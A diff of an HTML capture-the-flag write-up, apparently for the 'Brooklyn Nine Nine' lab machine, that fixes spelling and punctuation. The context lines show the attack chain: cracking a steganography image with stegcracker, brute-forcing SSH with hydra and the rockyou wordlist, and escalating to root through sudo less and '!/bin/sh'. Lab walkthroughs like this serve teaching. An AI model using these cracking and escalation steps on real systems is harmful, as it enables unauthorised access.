@@ -75,8 +75,8 @@ From Amy,
 
 Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
 </code></pre>
-<p>Nice! We can now note down 3 potencial usernames - Amy, Jake, Holt. But before we try to crack Jakes weak password lets check a web server on port 80.</p>
-<p>Let's see if there is anything usefull in the source code...YEP... we found a clue!</p> 
+<p>Nice! We can now note down 3 potencial usernames - Amy, Jake, Holt. But before we try to crack Jakes weak password let's check a web server on port 80.</p>
+<p>Let's see if there is anything useful in the source code...YEP... we found a clue!</p> 
 <pre><code>
 &lt;p&gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.&lt;/p&gt;
 &lt;!-- Have you ever heard of steganography? --&gt;
@@ -84,9 +84,9 @@ Jake please change your password. It is too weak and holt will be mad if someone
 <p>Download the picture and let's see what it hides. </p>
 <code> $ wget http://10.10.48.118/brooklyn99.jpg </code>
 
-<p>Unfortunately we cant extract it with steghide because we dont have a password. Let's use a tool called <a href="https://github.com/Paradoxis/StegCracker">stegcracker</a> </p>
+<p>Unfortunately we can't extract it with steghide because we don't have a password. Let's use a tool called <a href="https://github.com/Paradoxis/StegCracker">stegcracker</a>. </p>
 <pre><code>
-# stegcracker brooklyn99.jpg /opt/wordlists/rockyou.txt 
+$ stegcracker brooklyn99.jpg /opt/wordlists/rockyou.txt 
 StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
 Copyright (c) 2020 - Luke Paris (Paradoxis)
 
@@ -103,9 +103,9 @@ Holts Password:
 
 Enjoy!!
 </pre></code>
-<p>Nice we got Holt's password and now all we got to do is ssh in!</p>
+<p>Nice we got Holt's password and now all we have to do is ssh in!</p>
 <h2>NOTE</h2>
-<p>There is another way of getting into the machine. We know that Jake has weak password and we can use hydra to crack it</p>
+<p>There is another way of getting into the machine. We know that Jake has weak password and we can use hydra to crack it.</p>
 <pre><code>
 $ hydra -l jake -P /opt/wordlists/rockyou.txt 10.10.48.118 ssh
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
@@ -119,7 +119,7 @@ $ hydra -l jake -P /opt/wordlists/rockyou.txt 10.10.48.118 ssh
 $ find / -type f -iname user.txt 2>/dev/null
 /home/holt/user.txt
 </code></pre>
-<p> At this point we could just ssh in as Holt and get the flag but we need to escalate our privaleges to get the root flag anyways so lets get on with the fun part... Getting root access! </p>
+<p> At this point we could just ssh in as Holt and get the flag but we need to escalate our privaleges to get the root flag anyways so let's get on with the fun part... Getting root access! </p>
 <pre><code>
 $ sudo -l
 Matching Defaults entries for jake on brookly_nine_nine:
@@ -128,15 +128,15 @@ Matching Defaults entries for jake on brookly_nine_nine:
 User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
 </code></pre>
-<p> So Jake can use <code>less</code> with sudo without password! We could just use <code>less</code> and get the contents of user and root flags but thats not fun! <p>
+<p> So Jake can use <code>less</code> with sudo without password! We could just use <code>less</code> and get the contents of user and root flags but that's not fun! <p>
 <p> Time to check <a href="https://gtfobins.github.io/">GTFOBins</a> and see if we can get root privaleges.</p> 
-<p> Ahha there it is! First use:</p>
+<p> Ahha here it is! First use:</p>
 <code>
 sudo less /etc/profile
 </code>
 <p> and then just type:</p>
 <code> !/bin/sh </code>
-<p> And thats it! But let's make sure we are root first.</p>
+<p> And that's it! But let's make sure we are root first.</p>
 <pre><code>
 # whoami
 root
